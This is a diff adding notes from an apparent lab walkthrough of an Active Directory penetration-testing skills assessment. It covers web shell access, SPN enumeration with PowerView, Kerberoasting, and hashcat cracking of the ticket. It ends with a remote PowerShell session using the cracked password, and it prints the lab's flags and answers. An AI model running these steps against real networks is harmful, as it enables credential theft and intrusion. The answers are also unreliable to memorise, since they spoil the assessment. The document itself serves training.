@@ -4059,6 +4059,106 @@ cat c:\Users\Administrator\Desktop\flag.txt
 Results: burn1ng_d0wn_th3_f0rest!
 
 
+### AD Enumeration & Attacks - Skills Assessment Part I 
+
+A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: `admin:My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the `/uploads` directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.
+
+Apply what you learned in this module to compromise the domain and answer the questions below to complete part I of the skills assessment.
+
+**Submit the contents of the flag.txt file on the administrator Desktop of the web server**
+
+```
+# Enter in http:\\$ip\uploads
+# Enter creds
+# Run in the terminal
+c:\Users\Administrator\Desktop\flag.txt
+```
+
+Results: JusT_g3tt1ng_st@rt3d!
+
+
+**Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer**
+
+```
+# Enumerate SPNs with
+setspn.exe -Q */*
+
+### Results:
+# CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+# MSSQLSvc/SQL01.inlanefreight.local:1433
+
+# Also you can enumerate them by uploading the PowerView.ps1 the antak Choose File and Upload the file. In that case, the command line will be used to indicate the path. After that, you need to import-module every time you are going to use the cmdlet because the command line does not maintain the state. Everything runs in the context of the command.
+cd C:/Users/Administrator/Documents ; Import-Module .\PowerView.psm1 ; Get-DomainUser * -spn | select samaccountname
+```
+
+Results:  svc_sql
+
+
+**Crack the account's password. Submit the cleartext value.**
+
+```
+# Obtain the ticket
+cd C:/Users/Administrator/Documents ; Import-Module .\PowerView.psm1 ; Get-DomainSPNTicket -SPN MSSQLSvc/SQL01.inlanefreight.local:1433 -OutputFormat Hashcat | select -ExpandProperty Hash > file.txt ; cat file.txt
+
+# Copy ticket to the file sqlservice in my attacker machine and crack it:
+hashcat -m 13100 sqlserver /usr/share/wordlists/rockyou.txt
+```
+
+Results: lucky7
+
+
+**Submit the contents of the flag.txt file on the Administrator desktop on MS01**
+
+```
+# Create a SecureString object
+$password = ConvertTo-SecureString "lucky7" -AsPlainText -Force; $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\svc_sql", $password) ; Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
+
+
+```
+
+Results:
+
+
+**Find cleartext credentials for another domain user. Submit the username as your answer.**
+
+```
+
+```
+
+Results:
+
+
+
+**Submit this user's cleartext password.**
+
+```
+
+```
+
+Results:
+
+
+
+**What attack can this user perform?**
+
+```
+
+```
+
+Results:
+
+
+
+**Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01**
+
+```
+
+```
+
+Results:
+
+
+
 Question
 
 ```
